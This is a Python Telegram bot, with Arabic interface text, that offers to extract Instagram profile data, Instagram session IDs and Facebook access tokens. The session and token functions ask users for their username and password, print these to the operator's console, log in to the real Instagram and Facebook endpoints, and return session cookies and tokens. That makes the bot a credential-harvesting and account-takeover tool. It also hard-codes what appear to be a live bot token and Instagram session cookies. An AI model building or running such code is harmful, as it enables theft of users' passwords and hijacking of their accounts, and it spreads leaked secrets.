import telebot,random
import requests 
from telebot import types 
Token  = "5335238021:AAEGYECcmeeVRoF2-f5HnoBllwtyWF2r-bw"
bot = telebot.TeleBot(Token)
@bot.message_handler(commands=["start"])
def A(message):
    Id =message.chat.id
    Name = message.chat.first_name
    User = message.from_user.username
    A = types.InlineKeyboardMarkup(row_width = 1)
    B = types.InlineKeyboardButton(text = "استخراج معلومات حساب isntagram",callback_data = "A")
    C = types.InlineKeyboardButton(text = "سحب سيزن ايدي instagram",callback_data = "insta0")
    F = types.InlineKeyboardButton(text = "سحب توكن Facebook",callback_data = "Facebook")
    A.add(B,C,F)

    bot.send_message(message.chat.id,"""
*➖ 👋اهلا عزيزي *  [{}](tg://settings/)   
*➖ أيدك :* [{}](tg://settings/)            
*➖ يوزرك ان وجد :* @{}
*➖ قناه المبرمج :* ["𝙰𝙻𝙾𝚂𝙷"𝙿𝚈𝚃𝙷𝙾𝙽"](https://t.me/DtDtDt)
*➖ المبرمج :* [Alosh](https://t.me/aaalaaa)""".format(Name,Id,User),parse_mode="markdown",disable_web_page_preview=True,reply_markup=A)
@bot.callback_query_handler(func=lambda call: True)
def Hhh(call):
    
    if call.data == "A":
        us = bot.reply_to(call.message,text="*✅ ارسل يوزرك عزيزي*",parse_mode='markdown')
        bot.register_next_step_handler(us,get_info)
        
        
    if call.data =="Facebook":
        akk = bot.reply_to(call.message,text="*ارسل حسابك ب نمط\n user:pass*",parse_mode='markdown')
        bot.register_next_step_handler(akk,get_sessionid_Facebook)           
     
	
		
			
					
    elif call.data == "insta0":
        ak = bot.reply_to(call.message,text="*ارسل حسابك ب نمط\n user:pass*",parse_mode='markdown')
        bot.register_next_step_handler(ak,get_sessionid)   
        

		
def get_info(message):
    try:
        bot.reply_to(message,text=f"*✅ انتظر قليلا أحاول في إخراج معلومات حسابك*",parse_mode="markdown")                       
        msg  = message.text 
        url =(f"https://www.instagram.com/{msg}/?__a=1")
        head = {'accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar,en-US;q=0.9,en;q=0.8',
'cache-control':'max-age=0',
'cookie':'mid=YgdeBQALAAGo6nd_7ClrDUA5mgYn; ig_did=E6D106F6-AABE-4D3C-A855-7594FE902827; ig_nrcb=1; csrftoken=xt3OnG2JnlNaLnz64jxTl3jBo1bh9fN2; ds_user_id=52176361; sessionid=52176361%3A8xWQQB2d1TUeUu%3A21; shbid="11013\05452176361\0541676186066:01f73be26111eb4ad779ee0856d7ce991d7e8bb4c9f172c14d1088ef0f70c587ba54dbac"; shbts="1644650066\05452176361\0541676186066:01f7254411d68bfa10f77466c590b5399bad62b93cbbcf053ecd30cd3424fbadacc06114"; rur="NAO\05452176361\0541676317762:01f7107f6cadf8777871c991960b8cfeb5e94e3d6ae4a2f51316f5c2f82f9cae1e7b37e3"',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="98", "Google Chrome";v="98"',
'sec-ch-ua-mobile':'?0',
'sec-ch-ua-platform':'"Windows"',
'sec-fetch-dest':'document',
'sec-fetch-mode':'navigate',
'sec-fetch-site':'none',
'sec-fetch-user':'?1',
'upgrade-insecure-requests':'1',
'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36',}
        req =requests.get(url, headers=head).json()  
        following =req['graphql']['user']['edge_follow']['count']
        id=req['graphql']['user']['id']
        name=req['graphql']['user']['full_name']
        followes = req['graphql']['user']['edge_followed_by']['count']
        alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        alsh1 = alsh.json()            
        data = alsh1['data']
        bio=req['graphql']['user']['biography']
        pro=req ['graphql']['user']['profile_pic_url_hd']
        bot.send_photo(message.chat.id,pro,f"photo : [Open]({pro})",parse_mode="markdown")
        bot.send_message(message.chat.id,f"""
<strong> ✅ ᯓ تم سحب معلومات الحساب بنجاح
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ name : {name}
ᯓ 𝚄𝚂𝙴𝚁 : {message.text}           
ᯓ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : {followes}
ᯓ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {following}
ᯓ 𝙸𝙳 :  {id}
ᯓ bio :  {bio}
ᯓ 𝙳𝙰𝚃𝙴 : {data}
ᯓ ʟɪɴᴋ : https://instagram.com/{message.text}
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
Dv : @DtDtDt
By : @aaalaaa</strong>
                          """, parse_mode="html",disable_web_page_preview="true")
    except:
     	  bot.reply_to(message,text=f"*❌ عذرا يوزرك غير مسجل في انستكرام أو مبند *",parse_mode="markdown")       
     	  
     	  

def get_sessionid(message):
	try:							
		username=message.text.split(':')[0]
		password=message.text.split(':')[1]
		print(username,password)
		url = "https://www.instagram.com/accounts/login/ajax/"
		cookies =""				
		headers ={
"accept": "*/*",
"set-cookie":"csrftoken=RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP; Domain=.instagram.com; expires=Mon, 16-Jan-2023 13:05:57 GMT; Max-Age=31449600; Path=/; Secure",
"accept-encoding":"gzip, deflate, br",
"accept-language":"fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7",
"content-length": "321",
"content-type": "application/x-www-form-urlencoded",
'sec-ch-ua':'"Not;A Brand";v="99", "Google Chrome";v="97", "Chromium";v="97"',
"sec-ch-ua-mobile": "?0",
'sec-ch-ua-platform': '"Windows"',
"sec-fetch-dest": "empty",
"sec-fetch-mode": "cors",
"sec-fetch-site": "same-origin",
"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
"x-asbd-id": "198387",
"x-csrftoken": "RfrLPLyTlkMfwpamAJ0ORu3F4GufRMzP",
"x-ig-app-id": "936619743392459",
"x-ig-www-claim": "0",
"x-instagram-ajax": "bc3569920aaf",
"x-requested-with": "XMLHttpRequest"}
		data= {
"username": str(username),
"enc_password": "#PWD_INSTAGRAM_BROWSER:0:9775445428:"+str(password),
"optIntoOneTap": "false",
"queryParams": {},
"stopDeletionNonce": "",
"trustedDeviceRecords": {}}
		req = requests.post(url,headers=headers,data=data)
		if '"authenticated":true' in req.text:
			sessionid=req.cookies['sessionid']
			bot.reply_to(message,text=f"""
*✅ sessionid
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ sessionid :*`{sessionid}`
*⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
 ✅ Account Isntagram
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯*
*ᯓ User : *`{username}`
*ᯓ Pass : *`{password}`
*ᯓ Pass : *`{username}:{password}`
*⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓDv : @DtDtDt
ᯓBy : @aaalaaa*""",parse_mode='markdown')
			print(sessionid)
		elif '"message":"checkpoint_required"' in req.text:
			bot.reply_to(message,text='🔐 secure Account')	
		elif '"authenticated":false' in req.text:
			u=("❌ Erorr Account ")
			print(u)
			bot.reply_to(message,text=u)		
	except:
		bot.reply_to(message,text="عذرا لم اجد كهاذا زر!!")
		
		
def get_sessionid_Facebook(message):
	try:	
		username=message.text.split(':')[0]
		password=message.text.split(':')[1]
		print(username,password)
		url= 'https://b-api.facebook.com/method/auth.login'
		bd = random.randint(20000000.0, 30000000.0)
		sim = random.randint(20000.0, 40000.0)		
		headers ={
'x-fb-connection-bandwidth': repr(bd), 
                    'x-fb-sim-hni': repr(sim), 
                    'x-fb-net-hni': repr(sim), 
                    'x-fb-connection-quality': 'EXCELLENT', 
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                    'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N950N Build/NMF26X) [FBAN/FB4A;FBAV/251.0.0.31.111;FBPN/com.facebook.katana;FBLC/en_US;FBBV/188828013;FBCR/Advance Info Service;FBMF/samsung;FBDV/SM-N950N;FBSV/5.1.1;FBCA/x86;armeabi-v7a;FBDM{density=2.0,width=900,height=1600};FB_FW;FBRV/0;]', 
                    'content-type': 'application/x-www-form-urlencoded', 
                    'x-fb-http-engine': 'Liger'}
		data= {
'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
                   'format': 'JSON',
                   'sdk_version': '2',
                   'email': username,
                   'locale': 'en_US',
                   'password': password,
                   'sdk': 'ios',
                   'generate_session_cookies': '1',
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',}
		req = requests.post(url,headers=headers,data=data)
		if 'EAA' in req.text:
			#sessionid=req.json()["session_key"]
			token=req.json()['access_token']
			bot.reply_to(message,text=f"""
*✅ Token , 
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ Token :*`{token}`
*⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
 ✅ Account Facebook
⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯*
*ᯓ User : *`{username}`
*ᯓ Pass : *`{password}`
*⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
ᯓ Dv : @DtDtDt
ᯓ By : @aaalaaa*""",parse_mode='markdown')
		elif str("www.facebook.com") in req.json()['error_msg']:
			bot.reply_to(message,text='🔐 secure Account')	
		else:
			u=("❌ Erorr Account ")
			print(u)
			bot.reply_to(message,text=u)
	except:
		bot.reply_to(message,text="عذرا لم اجد كهاذا زر!!")			
bot.polling()